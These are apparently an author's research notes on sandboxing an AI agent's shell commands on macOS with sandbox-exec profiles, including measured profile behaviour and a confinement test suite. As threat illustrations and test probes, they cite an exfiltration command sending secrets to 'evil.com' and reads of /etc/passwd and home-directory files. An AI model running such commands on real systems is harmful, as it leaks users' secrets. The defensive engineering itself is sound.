# Chapter 23 research: OS-level sandboxing on macOS

Measured 2026-10-08 on the author's machine. Every claim below is marked
VERIFIED (observed directly, command and result reproduced here) or ASSUMED
(inferred or read, not executed). Nothing in this file is from memory.

Environment: macOS 26.3.1, arm64, `/usr/bin/sandbox-exec` present.

---

## Why the original Chapter 23 design fails

VERIFIED by inspection: the shipped chapter confines paths in userspace via
`resolveSandboxedPath`, called by the file tools. `run_command` never calls
it, because the shell is a separate process that does not go through our Go
code. So `cat ../../etc/passwd` walks straight past the boundary.

The chapter half-admits this in 23.4 ("does not prevent the command from
calling `cd /`") and falls back to repointing `HOME`, which is a speed bump,
not a wall. The scheme is only sound in safe mode, where `run_command` is
removed from the registry, and safe mode is not the configuration anyone
runs for real work.

Conclusion: a userspace path check cannot be the boundary. The kernel must
be.

---

## Mechanism inventory (macOS)

| Mechanism | Status | Notes |
|---|---|---|
| **Seatbelt / `sandbox-exec`** | VERIFIED works | Kernel-enforced. Deprecated in its own man page. What Codex CLI ships on. **Recommended.** |
| App Sandbox (entitlements) | ASSUMED unsuitable | Requires code signing + App Store style packaging; cannot wrap arbitrary spawned commands. |
| `chroot` | ASSUMED unsuitable | Needs root; weak boundary; no network or process control. |
| Docker / Podman / Apple `container` | ASSUMED works, rejected | Heavy dependency, requires a daemon or VM, changes the whole install story for a book exercise. |
| Virtualization.framework | ASSUMED works, rejected | Full VM. Far past the chapter's scope. |
| Endpoint Security framework | ASSUMED unsuitable | Monitoring, not confinement; requires an Apple-granted entitlement. |

Linux equivalents, for the portability note: Landlock (5.13+), seccomp-bpf,
namespaces, bubblewrap. ASSUMED, not tested — no Linux box in this session.

### Deprecation, stated honestly

VERIFIED, `man sandbox-exec`:

> NAME
>      sandbox-exec – execute within a sandbox (DEPRECATED)
>
> DESCRIPTION
>      The sandbox-exec command is DEPRECATED.

VERIFIED: it nonetheless works correctly on macOS 26.3.1 and is the
mechanism OpenAI's Codex CLI uses on macOS today. The chapter should say
both things plainly rather than hide either. Apple has deprecated it for
roughly a decade while continuing to ship and rely on it.

---

## Architecture: wrap the child, not the parent

The question "why not sandbox the whole ensemble binary?" has a concrete
answer.

VERIFIED: macOS sandboxes are **inherited by descendants**. With a profile
denying reads of `$HOME`:

- `sh -c 'sh -c "cat $HOME/.ch23probe"'` → `Operation not permitted`
- `python3 -c "subprocess.run(['cat', '$HOME/.ch23probe'])"` → `Operation not permitted`

A grandchild three levels down is still confined, so the model cannot shell
out to a helper process to launder a read.

VERIFIED: a Go binary on macOS is **not** dependency-free. `otool -L` on a
freshly built `./cmd`:

```
/usr/lib/libSystem.B.dylib
/usr/lib/libresolv.9.dylib
CoreFoundation.framework
Security.framework
```

(`Security.framework` is TLS verification, `libresolv` is DNS: exactly what
a networked binary needs.)

**Decision: sandbox the child, leave the binary outside.**

If ensemble itself runs inside the sandbox it needs network access to reach
the model API. Because children inherit, every `run_command` child would
inherit that network access too, and `curl -d @secrets evil.com` is back.
Keeping the binary outside lets the child profile say `(deny network*)`
absolutely, which is the single most valuable line in the profile.

Implementation is one line in `toolRunCommand`:

```go
cmd := exec.Command("sandbox-exec", "-f", profilePath, "sh", "-c", args.Command)
```

### Resulting division of labor

| Enforcement | Guards | Why it must be this one |
|---|---|---|
| Seatbelt profile on the child | `run_command` + entire descendant tree | kernel; the shell never calls our Go code |
| `resolveSandboxedPath` | `read_file`, `write_file`, `edit_file`, `list_directory`, `search_files` | these run in-process inside unsandboxed ensemble, where the kernel cannot help |

`resolveSandboxedPath` survives but is demoted: it is no longer the thesis,
it is the half of the boundary covering in-process tools.

---

## Measured SBPL behavior

### `(deny default)` does not work for this use case

VERIFIED: a profile starting `(deny default)` fails before `main`:

```
execvp() of '/bin/cat' failed: Operation not permitted
```

Importing `/System/Library/Sandbox/Profiles/bsd.sb` did not rescue it.

VERIFIED: `(allow default)` followed by targeted `(deny ...)` works. This is
also the shape Codex uses. All profiles below take that form.

### The root directory must be readable

VERIFIED via the system log, which is the only place the real reason
appeared:

```
cat(33766) deny(1) file-read-data /
```

`(allow file-read* (literal "/"))` is required or nothing starts. The denial
is on the root directory *entry*, not on a library.

Diagnostic command worth keeping:

```sh
log show --last 40s --predicate 'eventMessage CONTAINS "deny"' --style compact | grep deny
```

### SBPL matches PHYSICAL paths

VERIFIED by four-way isolation (one variable at a time):

| profile path | trailing slash | result |
|---|---|---|
| `/private/var/folders/.../T` | no | works |
| `/private/var/folders/.../T` | yes | works |
| `/var/folders/.../T` | no | **fails** |
| `/var/folders/.../T` | yes | **fails** |

So: the realpath is decisive; the trailing slash is irrelevant. `getconf
DARWIN_USER_TEMP_DIR` returns the `/var/...` form, which **never matches**,
because `/var` is a symlink to `/private/var`.

CORRECTION, recorded deliberately: an earlier hypothesis in this session
blamed the trailing slash. That was wrong, and it was only caught by
isolating the two variables. Two changes were made at once, the symptom
cleared, and the wrong cause was nearly written down as fact.

This is the same bug class as `canonicalRoot` in the Go code: compare
canonical paths on both sides, or compare neither.

### Toolchain needs the Darwin per-user dirs

VERIFIED: with read confinement on and those dirs not allowed, `git` and
`python3` both fail:

```
python3: error: couldn't open cache file '/var/folders/.../T/xcrun_db'
git: fatal: ... xcrun_db
```

The `/usr/bin` developer tools are `xcrun` shims and need their cache.
Allowing the realpath'd `DARWIN_USER_TEMP_DIR` and `DARWIN_USER_CACHE_DIR`
fixes it. VERIFIED: `python3` then runs and reads inside the sandbox
correctly.

Note `TMPDIR=` does **not** help: VERIFIED, `xcrun` reads the per-user dir
from `confstr`, not the environment.

### Confinement results with the working profile

VERIFIED, every line below observed. Positive controls listed alongside the
denials, because a sandbox that denies everything passes every negative test
and is worthless.

| Operation | Result |
|---|---|
| read file inside sandbox | `rc=0`, correct contents |
| write file inside sandbox | `rc=0` |
| `grep -r` inside sandbox | `rc=0` |
| `python3` reading inside | `rc=0` |
| read file outside sandbox | denied |
| `cat /etc/passwd` | `Operation not permitted` |
| read a real file in `$HOME` | `Operation not permitted` |
| `python3` reading `$HOME` | `Operation not permitted` |
| write outside sandbox | denied, file not created |
| `curl https://example.com` | denied |
| grandchild `sh -c sh -c cat $HOME/...` | `Operation not permitted` |

### Known cost: `git` needs explicit allowances

VERIFIED: inside the read-confined profile, `git --version` fails with

```
fatal: unable to access '/Users/bill/.gitconfig': Operation not permitted
```

This is correct confinement, not breakage, but it means a sandboxed agent
cannot run git without allowing `~/.gitconfig` (and likely `~/.gitignore`,
credential helpers, and SSH material for remotes). DECISION FOR AUTHOR:
document as a limitation, or open a narrow allowance.

### Read confinement vs. write-only confinement

VERIFIED: Codex's `workspace-write` mode allows reading the **entire
filesystem** and confines only writes and network.

VERIFIED: full read confinement is achievable here, at the cost of the
allowlist above (`/`, `/usr`, `/bin`, `/sbin`, `/System`, `/Library`,
`/dev`, the two Darwin per-user dirs, plus the workspace).

DECISION FOR AUTHOR: ch23 as written promises read confinement
(`read_file("../../etc/passwd")` must fail). Read confinement is strictly
better for the lethal-trifecta argument, since exfiltration needs something
to exfiltrate. It is also more fragile across toolchains. Recommend keeping
read confinement and documenting the allowlist as part of the lesson,
noting that Codex chose the weaker option.

---

## What this means for the chapter

Sections that describe a mechanism we are no longer building, and need
rewriting rather than patching:

- **TL;DR** — items 1 to 4 describe userspace path confinement as the scheme.
- **23.2 "The binary is the warden"** — still true, but for a different
  reason. The binary is trusted because it is outside the sandbox and holds
  credentials; it is not itself contained, and the chapter should not imply
  it is.
- **23.3 "One function, every path"** — demoted. No longer the thesis.
- **23.4 "Commands that cannot leave"** — currently states OS-level
  sandboxing is out of scope and settles for `HOME` repointing. This is now
  the heart of the chapter and must be rewritten.
- **23.9 "Taking it for a spin"** — walkthrough changes.
- **23.10 checks table** — `command-confinement` becomes kernel-enforced;
  likely add a grandchild-escape check, which is the compelling one.

Two defects in the existing prose that are wrong independent of the
redesign, both in the 23.3 code sample:

1. It does not canonicalize `root`, so on macOS every legitimate path under
   a `mktemp -d` sandbox is rejected (`/tmp` → `/private/tmp`). VERIFIED by
   mutation: removing canonicalization fails the positive controls.
2. It formats the **joined absolute** path into the error, handing the model
   the host filesystem layout. The brief explicitly forbids this.

## Open decisions for the author

1. Read confinement or write-only confinement (recommend: read).
2. `git` inside the sandbox: documented limitation or narrow allowance.
3. How much to say about `sandbox-exec` being deprecated (recommend: say it
   plainly, note Codex ships on it anyway).
4. Whether Linux/Landlock gets a portability section or a footnote.
5. `EnableWebSearch` wording: there are no builtin web tools. Ch21 delivered
   web access as the `web-search` skill over Firecrawl MCP, so the gate is
   on the skill, not on tool registration.

---

# Addendum: shipped implementation and further measurements

Added after the research above was written. Everything here is VERIFIED
unless marked.

## Architecture as built

Public package `agent/sandbox` (importable by applications on the
framework, which is the point: confinement is the last thing that should be
reimplemented per-application).

- `sandbox.Agent` — one-method interface, `SandboxRoot() string`. The
  Sandbox holds a BACK-POINTER to its parent through this and asks on every
  operation. It is declared in `sandbox` rather than being `common.Agent`
  for two reasons: `agent` imports `sandbox`, so the reverse edge would be
  an import cycle; and `internal/common` is unimportable outside the
  module, so an external application could not name the type.
- `common.Agent` gained `SandboxRoot() string`.
- `common.Sandbox` — new hub interface naming the confined operations.
  Internal packages depend on the hub; `*sandbox.Sandbox` satisfies it
  structurally. Neither side imports the other, so `agent.go` carries
  `var _ common.Sandbox = (*sandbox.Sandbox)(nil)` as the only thing
  keeping them in step.
- `agent.Sandbox` type alias re-exports `common.Sandbox`, matching the
  existing rule that external callers never import `internal/`.
- `AgentSpec.SandboxRoot` (a path, which the existing field comment already
  permits: "They are paths, which is data").

NOT built yet, deliberately: `SafeMode`, `EnableWebSearch`. Those are
Booleans rather than paths and need the author's ruling on the chapter
first.

### No caching of the root

`root()` re-canonicalizes on every operation. Caching would reintroduce the
staleness the back-pointer exists to eliminate, and because tools run on
job goroutines a memo field would need a mutex. `TestSandboxFollowsItsParent`
moves the parent's root mid-test and asserts the OLD root is then refused,
which fails if anyone adds a cache.

### Fail closed, three ways

1. A nil Sandbox or nil parent returns `ErrNoSandbox` from every operation,
   so a WIRING mistake refuses rather than silently allowing.
2. `Rooted("")` is refused. Unconfined operation must be asked for by name
   via `Unconfined()`, never produced by an empty string.
3. `Command` on a non-darwin platform returns `ErrUnsupportedPlatform`
   rather than running the command unconfined.

## Further measured SBPL findings

### `-p` inline profiles work; no profile file needed

VERIFIED: `sandbox-exec -p '<profile text>' cmd...` enforces identically to
`-f`. Used in the implementation, because the command outlives the function
that builds it (output streams back over a PTY), so a temp profile file
would need a lifetime tied to process exit and someone to delete it.

### The Darwin temp directory allowance was a real hole

VERIFIED: `mktemp -d` and Go's `t.TempDir()` both create directories INSIDE
`DARWIN_USER_TEMP_DIR`. Allowing that directory by `subpath` to satisfy the
Xcode shims therefore also grants read and write to every other process's
temporary files.

It was caught by accident: a test wrote its "outside" file into a
`mktemp -d` directory and the write SUCCEEDED, which looked like a `-p`
bug and was actually the profile working as written against a test that was
inside its own allowlist.

FIX, VERIFIED: scope by regex to the cache files, not by subpath to the
directory:

```
(allow file-read* file-write* (regex #"^/private/var/folders/.../T/xcrun_db"))
```

A `literal` cannot work: VERIFIED, the shim creates randomly suffixed files
(`xcrun_db-eozhFtQb`). With the regex form, writing `ch23leak.txt` into the
temp directory is DENIED and the file is not created, while `python3` and
`grep -r` work normally.

LESSON for the chapter: the obvious fix for "the toolchain needs its cache"
is to allow the directory, and that quietly widens the sandbox to a shared
location. Narrow to the files.

### `git` needs `/dev/null` for WRITING

VERIFIED: with `(deny file-write*)` and no `/dev/null` allowance, `git`
fails with "could not open '/dev/null' for reading and writing". The
profile allows write to `/dev/null`, `/dev/tty`, `/dev/stdout`,
`/dev/stderr`.

### LibreSSL needs `/private/etc/ssl`

VERIFIED: without it, `curl` dies reading
`/private/etc/ssl/openssl.cnf`. This matters for test validity, not
function: it makes a network attempt fail for a FILE reason, which
disguises itself as a network denial. An earlier network check in this
session was invalid for exactly that reason. With `/private/etc/ssl`
readable, `curl` gets far enough to genuinely try, and returns `HTTP000`.

### `git` still cannot read `~/.gitconfig`

VERIFIED and UNRESOLVED: `git --version` inside the profile fails with
"unable to access '/Users/<user>/.gitconfig': Operation not permitted".
This is correct confinement, not a defect. DECISION FOR AUTHOR: document
as a limitation, or open a narrow allowance for git configuration.

## Test suite

`go test ./sandbox/` — 25 tests, 37 including subtests, ZERO skips on this
machine. The integration tests spawn real processes under the real sandbox.

Mutation audit of the kernel half, VERIFIED. Removing the `sandbox-exec`
wrapping from `Command`:

| Test | Result under mutation |
|---|---|
| `TestConfinedCommandAllowsLegitimateWork` | PASS (correct: it is the positive control) |
| `TestConfinedCommandCannotReadOutside` | FAIL |
| `TestConfinedCommandCannotWriteOutside` | FAIL |
| `TestConfinedGrandchildIsStillConfined` | FAIL |
| `TestConfinedCommandHasNoNetwork` | FAIL |
| `TestConfinedCommandHasNoCredentials` | PASS (guards the environment, untouched by this mutant) |

Earlier probes on the userspace half, VERIFIED: removing the separator from
the prefix check kills only `TestResolveRejectsSiblingPrefix`; removing
`EvalSymlinks` kills the symlink tests AND the absolute-path positive
controls (a blunt mutant, which also demonstrates the macOS
canonicalization requirement empirically).

## Chapter 22 consequence worth reporting

Adding `SandboxRoot()` to `common.Agent` forced the method onto five
implementers, including `*Logger`. Chapter 22 used `*Logger` satisfying
`common.Agent` as its exhibit for an interface that "never grew past its
name". Chapter 23 grew it. `*Logger.SandboxRoot()` returns "" honestly, since
a logger has no sandbox, but the exhibit is now dated and ch22's text may
need a forward reference. DECISION FOR AUTHOR.
